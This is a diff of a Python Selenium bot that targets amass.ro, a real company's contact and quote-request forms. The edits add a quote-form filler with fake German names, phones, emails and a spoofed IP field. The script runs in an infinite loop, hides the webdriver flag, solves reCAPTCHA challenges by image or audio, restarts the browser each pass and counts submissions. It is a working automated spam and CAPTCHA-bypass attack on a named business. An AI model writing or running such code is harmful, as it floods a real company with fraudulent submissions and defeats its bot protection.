@@ -186,7 +186,7 @@ def image_recaptcha(driver, iframe):
             payload = imgs[0]["src"]
             if len(imgs) > max_width:
                 max_width = len(imgs)
-        
+
         #  Pull down captcha to attack and organize directory structure
         urllib.request.urlretrieve(payload, "captcha.jpeg")
         os.system("mv captcha.jpeg "+TASK_PATH+"/full_payload.jpeg")
@@ -204,15 +204,15 @@ def image_recaptcha(driver, iframe):
             y = math.floor(idx % max_width + 1)
             to_solve_queue[(x, y)] = f
             idx += 1
-        
+
         logger.debug(to_solve_queue)
-        
+
         coor_dict = {}
         handle_queue(to_solve_queue, coor_dict, target)  # multithread builds out where to click
         logger.debug(coor_dict)
         #os.system("rm "+TASK_PATH+"/full_payload.jpeg")
-        
-        driver.switch_to.default_content()  
+
+        driver.switch_to.default_content()
         iframe = driver.find_element(By.XPATH, "/html/body/div/div[4]/iframe")
         driver.switch_to.frame(iframe)
 
@@ -340,6 +340,12 @@ def type_like_human(driver, element, string):
 
 type_style = type_like_bot
 
+def fill_out_ip(driver, fake):
+    random_ip = fake.ipv4_public()
+    ip = driver.find_element(By.ID, "ip")
+    driver.execute_script("arguments[0].value = '" + random_ip + "'", ip)
+    logger.debug("IP is: " + random_ip)
+
 def fill_out_profile(driver):
     fake = Faker("de_DE")
 
@@ -354,10 +360,25 @@ def fill_out_profile(driver):
     type_style(driver, "email", email)
     type_like_bot(driver, "mesaj", fake.text())
 
-    random_ip = fake.ipv4_public()
-    ip = driver.find_element(By.ID, "ip")
-    driver.execute_script("arguments[0].value = '" + random_ip + "'", ip)
-    logger.debug("IP is: " + random_ip)
+    fill_out_ip(driver, fake)
+
+def fill_out_offer(driver):
+    fake = Faker("de_DE")
+
+    user = fake.simple_profile()
+    email = user["mail"].replace("@", str(random.randint(0, 40))+"@")
+
+    wait_between(1, 2)
+    type_style(driver, "nume", fake.first_name())
+    type_style(driver, "prenume", fake.last_name())
+    type_style(driver, "telefon", fake.phone_number())
+    type_style(driver, "email", email)
+    type_style(driver, "suprafata", random.randint(50, 500))
+    type_style(driver, "localitate", fake.city())
+    type_like_bot(driver, "alte_sp", fake.text())
+
+    fill_out_ip(driver, fake)
+
 
 ##############################  MAIN  ##############################
 def main():
@@ -371,49 +392,46 @@ def main():
     chrome_options.add_argument("user-data-dir=d:\\tmp\\customer")
     chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36")
 
-
-    if CHROMEDRIVER_PATH:
-        driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=chrome_options)
-        logger.debug("Starting custom chromedriver %s" % CHROMEDRIVER_PATH)
-    else:
-        driver = webdriver.Chrome(chrome_options=chrome_options)
-        logger.debug("Starting system default chromedriver")
-
-    agent = driver.execute_script("return navigator.userAgent")
-    logger.debug("Starting driver with user agent %s" % agent)
-
     #Initiate attack in an infinite loop
     submitted = 0
     while True:
 
-        logger.info("Starting attack on Amass's recaptcha")
-        driver.get("https://www.amass.ro/contact.html")
+        if CHROMEDRIVER_PATH:
+            driver = webdriver.Chrome(CHROMEDRIVER_PATH, chrome_options=chrome_options)
+            logger.debug("Starting custom chromedriver %s" % CHROMEDRIVER_PATH)
+        else:
+            driver = webdriver.Chrome(chrome_options=chrome_options)
+            logger.debug("Starting system default chromedriver")
 
-        driver.delete_all_cookies()
-        logger.debug("Cookies cleared")
+        agent = driver.execute_script("return navigator.userAgent")
+        logger.debug("Starting driver with user agent %s" % agent)
+
+        #driver.get("https://www.amass.ro/contact.html")
+        driver.get("https://www.amass.ro/cere-o-cotatie-pentru-incalzirea-electrica")
+
+        # driver.delete_all_cookies()
 
         #avoid detection of automated control
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => false,})")
         wait_between(1, 4)
 
-        logger.debug("Filling out Contact form")
-        fill_out_profile(driver)
+        logger.debug("Filling out form")
+        #fill_out_profile(driver)
+        fill_out_offer(driver)
 
         #scroll to end of form
         submit = driver.find_element(By.ID, "send-message")
         driver.execute_script("arguments[0].scrollIntoView();", submit)
 
-        WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")))
-        iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")
-
-        driver.delete_all_cookies()
+        #WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")))
+        #iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/iframe")
+        WebDriverWait(driver, 60).until(EC.visibility_of_element_located((By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/div/iframe")))
+        iframeSwitch = driver.find_element(By.XPATH, "//*[@id=\"frmContact\"]/div[2]/div[1]/div/div/div/iframe")
         driver.switch_to.frame(iframeSwitch)
-        #ActionChains(driver).move_to_element(iframeSwitch).perform()
-        driver.delete_all_cookies()
+
         logger.info("Recaptcha located. Engaging")
         WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-anchor")))
         ele = driver.find_element(By.ID, "recaptcha-anchor")
-        #ActionChains(driver).move_to_element(ele).perform()
         ele.click()
         driver.switch_to.default_content()
 
@@ -423,7 +441,24 @@ def main():
         WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "rc-imageselect")))
 
         if ATTACK_IMAGES:
-            image_recaptcha(driver, iframe)
+            try:
+                image_recaptcha(driver, iframe)
+
+                driver.switch_to.default_content()
+                driver.execute_script("arguments[0].scrollIntoView();", submit)
+                wait_between(3, 5)
+                submit.click()
+
+                submitted += 1
+                logger.debug("--- Submitted " + str(submitted) + " times! ---")
+
+                wait_between(2, 5)
+
+            except Exception as e:
+                print(e)
+
+            finally:
+                driver.quit()
 
         elif ATTACK_AUDIO:
             WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "recaptcha-audio-button")))
@@ -458,16 +493,6 @@ def main():
                 except Exception as e:
                     print (e)
                     guess_again = False
-
-        driver.switch_to.default_content()
-        driver.execute_script("arguments[0].scrollIntoView();", submit)
-        wait_between(3, 5)
-        submit.click()
-
-        submitted += 1
-        logger.debug("--- Submitted " + str(submitted) + " times! ---")
-
-        wait_between(20, 25)
 
 main()
 # test_all()
